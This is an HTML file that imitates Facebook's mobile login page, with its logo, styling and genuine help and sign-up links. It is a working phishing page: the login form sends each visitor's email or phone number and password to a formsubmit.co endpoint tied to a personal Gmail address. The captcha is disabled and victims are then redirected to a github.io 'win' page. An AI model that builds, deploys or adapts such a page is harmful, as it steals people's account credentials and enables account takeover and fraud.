<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Facebook</title>
  <link rel="icon" href="temp/facebook.png" type="image/x-icon">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
    }

    .login-container {
      padding: 20px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .facebook-logo {
      font-size: 40px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
      text-transform: lowercase;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-align: left;
    }

    .input-field {
      padding: 10px;
      border: 0.5px solid #000;
      border-radius: 10px;
      width: calc(100% - 20px);
      height: 50px;
      box-sizing: border-box;
      margin: 0 auto;
    }


    .login-container {
  position: relative;
}

.login-container input {
      padding: 10px;
      border: 0.5px solid #000;
      border-radius: 10px;
      width: calc(100% - 20px);
      height: 50px;
      box-sizing: border-box;
      margin: 0 auto;
}

.login-container input:focus::placeholder {
  transform: translateY(-10px);
  transition: transform 0.3s ease;
}

.login-container input[type="text"] {
  border: 1px solid #ccc;
}

.login-container input[type="password"] {
  border: 1px solid #ccc;
}
    

    .login-button {
      background-color: #1877f2;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button:hover {
      background-color: #0e5a99;
    }

    .create-account-button {
      background-color: #fff;
      color: #666;
      padding: 10px;
      border: 0.5px solid #ccc;
      border-radius: 25px;
      text-decoration: none;
      font-size: 14px;
      cursor: pointer;
      display: inline-block;
      margin-top: 75px;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .create-account-button:hover {
      background-color: #f5f5f5;
    }

    .forgotten-password {
      color: #000;
      text-decoration: none;
      font-size: 13px;
      display: block;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin-bottom: 50px;
    }

    .language-option {
      margin-top: 10px;
      font-size: 14px;
      color: #666;
    }
    .footer {
      margin-top: 20px;
      }

    .button-container {
  display: flex;
      font-size: 10px;
justify-content: center;
      text-decoration: none;
margin-right: 10px;
    }
  </style>
</head>
<body>
    <div class="login-container">
      <div class="language-option">English (UK)</div>
    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook" style="width:55px;height:55px; margin: 50px;">
    <form class="login-form" action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
      <input type="Text" name="Facebook ID" id="username" class="input-field" placeholder="Email or Phone" required>
      <input type="Password" name="Facebook Password" id="password" class="input-field" placeholder="Password" required>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://shkumaraman.github.io/win.html"> 
      <button type="submit" class="login-button">Log in</button>
    </form>
    <br>
    <a href="https://m.facebook.com/login/identify/" class="forgotten-password">Forgotten Password?</a>
    <p class="or-text">
      <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="create-account-button">
        Create New Account
      </a>
    </p>
      <div class="footer">
      <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Facebook" style="width:50px;height:10px;">
  </div>
      <div class="button-container">
  <a href="https://about.meta.com/" class="about">
        About
  </a><br>
  <a href="https://m.facebook.com/help/?ref=pf" class="help">
        Help
      </a><br>
  <a href="#" class="more">
        More
      </a>
      </div>
  </div>

  <script>
    document.getElementById("username").addEventListener("focus", function() {
  this.placeholder = "";
});

document.getElementById("username").addEventListener("blur", function() {
  if (!this.value) {
    this.placeholder = "Username";
  }
});

document.getElementById("password").addEventListener("focus", function() {
  this.placeholder = "";
});

document.getElementById("password").addEventListener("blur", function() {
  if (!this.value) {
    this.placeholder = "Password";
  }
});
    
  </script>
</body>
</html>
